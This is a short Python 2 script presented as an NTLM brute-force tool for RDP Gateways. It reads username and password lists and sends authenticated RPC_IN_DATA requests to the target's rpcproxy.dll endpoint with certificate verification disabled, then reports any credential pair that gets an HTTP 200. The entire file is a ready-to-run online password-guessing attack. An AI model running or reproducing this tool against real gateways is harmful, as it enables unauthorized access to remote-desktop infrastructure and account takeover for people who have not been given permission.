import sys
import pycurl

if len(sys.argv) != 5:
        print "[*] NTLM Brute Force Tool For RDP Gateways"
        print "[*] Usage: %s <RDP Gateway IP> <users file> <passwords file> <domain> [debug]" % sys.argv[0]
        print "[*] Example: %s localhost users.txt passwords.txt WORK\n" % sys.argv[0]
        print "[*] Coded by deniz cevik from biznet.com.tr\n"
        sys.exit(0)

target = sys.argv[1]
users_file = sys.argv[2]
passwords_file = sys.argv[3]
domain = sys.argv[4]

rdp_gateway = "https://"+target+"/rpc/rpcproxy.dll?localhost:3388"

def log(debug_type, debug_msg):
    print "debug (%d): %s" % (debug_type, debug_msg)

def brute_force(username,password):
        updata = domain + "\\"+username+":" + password
        packet = pycurl.Curl()
        packet.setopt(pycurl.URL,rdp_gateway)
        packet.setopt(pycurl.CUSTOMREQUEST, "RPC_IN_DATA")
        packet.setopt(pycurl.SSL_VERIFYPEER, 0)
        packet.setopt(pycurl.USERAGENT, "MSRPC")
        packet.setopt(pycurl.HTTPAUTH, 8)
        packet.setopt(pycurl.USERPWD,updata)
        #packet.setopt(pycurl.VERBOSE, 0)
        #packet.setopt(pycurl.DEBUGFUNCTION, log) 
        try:
                packet.perform()
                result_code = packet.getinfo(pycurl.RESPONSE_CODE)
                if (result_code) == 200:
                        print "[+] Password Guessed : " + updata+ "\n" 
        except:
                print "Failure"


def main():
        for username in open(users_file):
                for password in open(passwords_file):
                        brute_force(username.rstrip(),password.rstrip())
print "[*] Guessing RDP Passwords...."
main()
print "[*] done."